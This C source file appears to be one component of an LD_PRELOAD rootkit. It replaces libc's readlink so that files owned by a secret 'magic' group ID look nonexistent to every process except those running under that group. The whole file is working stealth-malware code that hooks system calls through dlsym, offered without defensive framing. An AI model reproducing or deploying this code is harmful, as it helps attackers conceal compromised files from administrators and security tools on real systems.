/* This one function is such a pain, it gets its own fucking object file! */

#include <string.h>
#include <dlfcn.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "inc/config.h"
gid_t (*old_getgid)(void);
static void *libc;
extern void * (*real_dlsym)(void *handle, const char *name);
extern void find_dlsym();
char *getpath(const char *path);
extern void * (*real_dlsym)(void *handle, const char *name);
extern void *_dl_sym(void *, const char *, void *);
static ssize_t (*old_readlink)(const char *path, char *buf, size_t bufsiz);
static int (*old_lxstat) (int ver, const char *file, struct stat * buf);

size_t readlink(const char *path, char *buf, size_t bufsiz) {
  struct stat s_fstat;
  struct stat s_dfstat;
  char *dpath = getpath(path);
  int s, s2;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!real_dlsym) find_dlsym();
  if(!old_readlink) old_readlink =real_dlsym(libc,"readlink");
  if(!old_lxstat) old_lxstat =  real_dlsym(libc, "__lxstat");
  if(!old_getgid) old_getgid = real_dlsym(libc, "getgid");
  if(old_getgid() == MAGIC_GID) return old_readlink(path,buf,bufsiz);
  memset(&s_fstat, 0, sizeof(stat));
  memset(&s_dfstat, 0, sizeof(stat));
  s = old_lxstat(_STAT_VER,path,&s_fstat);
  s2 = old_lxstat(_STAT_VER,dpath,&s_dfstat);
  if(s != 0 || s2 != 0) { errno = ENOENT; return -1; }
  if(s_fstat.st_gid == MAGIC_GID || s_dfstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }
  return old_readlink(path,buf,bufsiz);
}

